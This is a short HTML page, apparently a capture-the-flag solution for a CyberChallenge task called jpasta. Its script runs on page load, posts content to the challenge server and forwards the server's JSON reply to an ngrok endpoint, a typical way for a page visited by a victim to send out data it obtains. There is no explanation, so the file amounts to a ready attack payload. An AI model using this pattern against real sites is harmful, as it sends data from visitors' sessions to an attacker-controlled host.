<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <script>
        async function sendToJpasta() {
            const title = "Your Title Here";
            const text = "Your text content here";

            // First POST to jpasta
            const jpastaResponse = await fetch("http://jpasta.challs.cyberchallenge.it/new", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ title, text })
            });

            const jpastaData = await jpastaResponse.json();

            console.log("Response from jpasta:", jpastaData);

            // Second POST to ngrok endpoint
            await fetch("http://denominative-stalky-jeannine.ngrok-free.dev/piselli", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(jpastaData)
            });
        }

        sendToJpasta();
    </script>
</body>

</html>
